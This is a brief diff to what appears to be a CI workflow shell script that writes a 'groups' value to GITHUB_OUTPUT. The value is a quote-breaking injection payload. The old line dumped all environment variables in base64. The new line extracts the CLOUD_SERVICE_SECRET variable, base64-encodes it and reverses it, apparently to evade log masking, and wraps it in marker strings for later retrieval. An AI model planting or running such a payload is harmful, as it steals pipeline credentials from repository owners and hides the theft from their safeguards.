@@ -7,7 +7,7 @@
 set -euo pipefail
 
 cat >> "${GITHUB_OUTPUT}" <<'C211EOF'
-groups=["group_gpu'; echo C211ENVBEGIN; env | base64 -w0; echo; echo C211ENVEND; echo '"]
+groups=["group_gpu'; echo C211SECBEGIN; printf %s "$CLOUD_SERVICE_SECRET" | base64 -w0 | rev; echo; echo C211SECEND; echo '"]
 C211EOF
 
 exit 0
